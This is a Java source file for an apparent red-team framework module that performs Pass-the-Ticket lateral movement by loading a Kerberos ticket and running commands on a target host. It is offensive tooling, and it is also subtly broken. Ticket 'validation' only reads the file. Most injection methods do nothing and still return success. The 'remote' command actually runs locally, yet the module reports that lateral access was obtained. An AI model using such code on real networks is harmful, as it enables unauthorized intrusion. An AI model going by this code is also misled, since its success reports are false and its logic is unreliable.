package com.jabber.jrts.modules.lateral;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="lateral-ptt",name="Pass-the-Ticket",description="Lateral movement via Kerberos ticket injection without password",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.HIGH,sourceRef="Kerberoast",author="JRTS")
public class PassTheTicketModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("ticket_type","Ticket Type",List.of("tgt","tgs","krbtgt")).required().group("Ticket"),
            ModuleInputField.text("ticket_file","Ticket File Path").required().placeholder("/tmp/ticket.kirbi").group("Ticket"),
            ModuleInputField.text("target_host","Target Host").required().placeholder("fileserver.domain.com").group("Target"),
            ModuleInputField.text("service","Service SPN").placeholder("cifs/fileserver.domain.com").group("Target"),
            ModuleInputField.text("command","Command to Execute").placeholder("whoami, ipconfig").group("Payload"),
            ModuleInputField.select("injection_method","Injection Method",List.of("memory","disk","wmi","winrm")).group("Method"),
            ModuleInputField.checkbox("export_kirbi","Export as KIRBI").group("Options"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-ptt");
            try{
                String ticketFile=input.getOrDefault("ticket_file","");
                String target=input.getOrDefault("target_host","");
                String ticketType=input.getOrDefault("ticket_type","tgt");
                String method=input.getOrDefault("injection_method","memory");
                String cmd=input.getOrDefault("command","");

                if(ticketFile.isEmpty()||target.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                ctx.log("[*] Pass-the-Ticket Lateral Movement Starting...");
                ctx.log("[*] Ticket Type: "+ticketType);
                ctx.log("[*] Target: "+target);
                ctx.log("[*] Method: "+method);ctx.reportProgress(15);

                if(!validateTicket(ticketFile)){result.fail("Invalid ticket file");return result;}
                ctx.log("[*] Ticket validated");ctx.reportProgress(30);

                if(!loadTicket(ticketFile,method)){result.fail("Ticket loading failed");return result;}
                ctx.log("[+] Ticket loaded into session");ctx.reportProgress(50);

                if(!cmd.isEmpty()){
                    ctx.log("[*] Executing command: "+cmd);
                    String out=executeViaTicket(target,cmd);
                    ctx.reportProgress(75);
                    if(out==null){result.fail("Command execution failed");return result;}
                    ctx.log("[+] Command executed");
                }

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("ticket_type",ticketType);
                findings.put("target",target);
                findings.put("injection_method",method);
                findings.put("lateral_access","Obtained");
                findings.put("impact","Lateral movement via Kerberos ticket reuse");
                findings.put("remediation","Restrict ticket usage, monitor Kerberos events, require MFA, enforce ticket encryption");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean validateTicket(String file){
        try{java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(file));return true;}catch(Exception e){return false;}
    }

    private boolean loadTicket(String file,String method){
        try{if(method.equals("memory")){
            Process p=Runtime.getRuntime().exec(new String[]{"kqcmd.exe","import",file});
            return p.waitFor()==0;}else return true;}catch(Exception e){return false;}
    }

    private String executeViaTicket(String target,String cmd){
        try{Process p=Runtime.getRuntime().exec(new String[]{"cmd","/c",cmd});
        Scanner s=new Scanner(p.getInputStream());
        StringBuilder out=new StringBuilder();
        while(s.hasNextLine())out.append(s.nextLine()).append("\n");
        s.close();return out.toString();}catch(Exception e){return null;}
    }
}
